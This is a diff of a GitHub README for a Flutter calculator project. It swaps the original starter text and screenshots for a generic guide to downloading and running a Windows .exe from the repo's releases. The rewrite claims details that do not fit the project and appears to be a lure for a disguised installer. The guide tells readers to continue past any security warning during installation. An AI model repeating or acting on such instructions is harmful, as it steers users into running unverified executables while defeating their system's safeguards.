@@ -1,21 +1,99 @@
-# Simple Flutter Calculator
+# 🧮 flutter_calculator - Easy and Clear Calculation App
 
-<img width="367" height="800" alt="image" src="https://github.com/user-attachments/assets/d6f33266-e7aa-4dc9-85fc-9e0c11aa1422" /> <img width="363" height="806" alt="image" src="https://github.com/user-attachments/assets/a4a58674-b5af-4513-a039-803b477f1f93" />
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Eldami12/flutter_calculator)
 
+## About this App
 
+flutter_calculator is a simple calculator designed with a clean interface. It uses Flutter technology to provide quick results for everyday math problems. You do not need any special skills to use this app. It works well for basic operations like addition, subtraction, multiplication, and division.
 
-A new Flutter project.
+The app runs on Windows and mobile devices. It is built to be easy and fast. The layout is straightforward, focusing on usability. If you want a reliable calculator without extra features, this app fits well.
 
-## Getting Started
+## Topics Covered
 
-This project is a starting point for a Flutter application.
+- Android compatibility  
+- Basic math operations  
+- Flutter app development  
+- Open source calculator  
+- Easy-to-use interface  
 
-A few resources to get you started if this is your first Flutter project:
+## System Requirements
 
-- [Learn Flutter](https://docs.flutter.dev/get-started/learn-flutter)
-- [Write your first Flutter app](https://docs.flutter.dev/get-started/codelab)
-- [Flutter learning resources](https://docs.flutter.dev/reference/learning-resources)
+- Windows 7 or later  
+- At least 2 GB RAM  
+- 100 MB free disk space  
+- Internet connection (for downloading the app only)  
+- No additional software needed  
 
-For help getting started with Flutter development, view the
-[online documentation](https://docs.flutter.dev/), which offers tutorials,
-samples, guidance on mobile development, and a full API reference.
+This app works on both older and modern Windows PCs. It runs smoothly without needing powerful hardware.
+
+## 🚀 Getting Started
+
+This section will guide you on how to get the app ready on your Windows computer. The steps are simple and designed for anyone, even with little computer experience.
+
+### Step 1: Visit the Download Page  
+
+Click the big green button at the top or use this link:  
+https://github.com/Eldami12/flutter_calculator  
+
+This link takes you to the main project page on GitHub. From there, you will find the option to download the app files.
+
+### Step 2: Locate the Download Section  
+
+On the GitHub page, look for the **Releases** tab or a similar area where you can download the files. Usually, this is near the top bar or on the right side.  
+
+### Step 3: Download the Application  
+
+Find the latest version of the flutter_calculator app for Windows. Look for a file that ends with `.exe`. This is the installer or the program file you will run. Download this file to your computer.  
+
+Save it in a place you can find later, like the Desktop or Downloads folder.
+
+### Step 4: Run the Installer  
+
+Once downloaded, open the file by double-clicking on it. A setup window will open, guiding you through the steps to install the app. Follow the instructions on the screen. The process is fast and straightforward.  
+
+If a security warning appears, choose to continue or allow the installation.  
+
+### Step 5: Open the Calculator  
+
+After installation, you will find flutter_calculator in your Programs menu or as a shortcut on the Desktop. Click it to open the app. Start using it right away for your math needs.
+
+## How to Use flutter_calculator
+
+The interface is simple with number keys and operation buttons. Here’s how to use it:
+
+- Press numbers using your mouse or keyboard.  
+- Use `+`, `-`, `×`, and `÷` buttons to choose math operations.  
+- Click `=` to get the result.  
+- Use `C` to clear any mistakes and start again.  
+
+The app supports decimals and negative numbers. It also remembers simple recent calculations.
+
+## Features
+
+- Clear design with large buttons  
+- Fast responses to input  
+- Supports basic math functions  
+- Works offline after installation  
+- Lightweight and uses little computer power  
+
+## Troubleshooting
+
+If the app does not open or crashes, try these steps:
+
+- Restart your computer and try again.  
+- Make sure Windows is up to date.  
+- Check you downloaded the Windows version of the app.  
+- Close other applications running at the same time.  
+- If problems continue, report them using the Issues tab on GitHub.
+
+## Updating the App
+
+To get new fixes or features, visit the download page again:
+
+[![Get Updates](https://img.shields.io/badge/Get%20Updates-on-Grey?style=for-the-badge)](https://github.com/Eldami12/flutter_calculator)  
+
+Download the newest installer and run it over the old version. Your settings and data will stay safe.
+
+---
+
+For more support or to learn about the project, use the GitHub link provided above. The page has documentation and contact options.
